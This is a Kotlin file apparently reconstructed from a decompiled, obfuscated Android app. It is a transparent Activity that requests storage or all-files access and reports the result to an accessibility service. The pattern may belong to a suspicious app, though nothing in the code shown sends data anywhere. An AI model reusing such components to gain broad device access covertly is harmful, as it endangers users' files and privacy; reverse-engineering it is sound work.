package com.storm.safe.rock.activity

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.util.Log
import com.storm.safe.rock.p000.PermissionHelper
import com.storm.safe.rock.service.MyAccessibilityService

/**
 * JADX: htvekhdt.java (102 lines)
 * Transparent Activity that requests storage permission.
 *
 * Flow:
 * - Android 30+: uses MANAGE_APP_ALL_FILES_ACCESS_PERMISSION
 * - Android <30: uses READ_EXTERNAL_STORAGE + WRITE_EXTERNAL_STORAGE
 * - Broadcasts result via STORAGE_PERMISSION_RESULT
 *
 * JADX references:
 * - dqtvuisjd.f52358m1 → MyAccessibilityService.Companion (isPermissionRequesting)
 * - AbstractC1117qo.m214411a7 → ContextCompat.checkSelfPermission
 * - AbstractC1117qo.m214459f8 → ActivityCompat.requestPermissions
 * - tz0.m214807a7 → Log.w with string concat
 */
class htvekhdt : Activity() {

    companion object {
        private const val TAG = "StoragePermission"
        private const val REQUEST_CODE_STORAGE = 152
        private const val REQUEST_CODE_ALL_FILES = 153
    }

    /**
     * Broadcast storage permission result and clean up.
     * JADX: m211186a0(boolean)
     */
    private fun broadcastResult(granted: Boolean) {
        MyAccessibilityService.isPermissionRequesting = false
        try {
            val intent = Intent("${packageName}.STORAGE_PERMISSION_RESULT")
            intent.putExtra("granted", granted)
            intent.setPackage(packageName)
            sendBroadcast(intent)
        } catch (e: Exception) {
            Log.w(TAG, "发送广播失败: ${e.message}")
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE_ALL_FILES) {
            val granted = if (Build.VERSION.SDK_INT >= 30) {
                Environment.isExternalStorageManager()
            } else {
                false
            }
            broadcastResult(granted)
            finish()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            MyAccessibilityService.isPermissionRequesting = true
            val sdkInt = Build.VERSION.SDK_INT
            val alreadyGranted = if (sdkInt >= 30) {
                Environment.isExternalStorageManager()
            } else {
                checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") == 0
            }
            if (alreadyGranted) {
                broadcastResult(true)
                finish()
                return
            }
            if (sdkInt < 30) {
                // JADX: AbstractC1117qo.m214459f8 → PermissionHelper.requestPermissions
                PermissionHelper.requestPermissions(
                    this,
                    arrayOf(
                        "android.permission.READ_EXTERNAL_STORAGE",
                        "android.permission.WRITE_EXTERNAL_STORAGE"
                    ),
                    REQUEST_CODE_STORAGE
                )
                return
            }
            // Android 30+ — request all files access
            try {
                val intent = Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION")
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, REQUEST_CODE_ALL_FILES)
            } catch (_: Exception) {
                Log.w(TAG, "直接跳转失败，使用备用方案")
                startActivityForResult(
                    Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION"),
                    REQUEST_CODE_ALL_FILES
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "权限请求异常: ${e.message}")
            broadcastResult(false)
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        MyAccessibilityService.isPermissionRequesting = false
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_STORAGE) {
            broadcastResult(grantResults.isNotEmpty() && grantResults[0] == 0)
            finish()
        }
    }
}
